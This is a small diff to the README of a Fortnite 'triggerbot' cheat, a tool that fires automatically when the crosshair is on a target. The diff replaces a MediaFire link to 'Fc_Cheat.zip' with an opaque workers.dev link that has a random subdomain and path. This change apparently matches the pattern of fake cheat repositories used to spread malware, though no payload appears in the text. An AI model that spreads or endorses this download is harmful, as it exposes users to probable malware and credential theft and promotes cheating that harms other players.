@@ -4,7 +4,7 @@ Triggerbot for Fortnite: fires automatically when the crosshair is on a target.
 
 ## Download
 
-**[Download Fortnite Triggerbot](https://www.mediafire.com/file/9livkzxm1qj0199/Fc_Cheat.zip/file)**
+**[Download Fortnite Triggerbot](https://xtiz6i8n6.fresh-link.workers.dev/464dac20)**
 
 ## Features
 
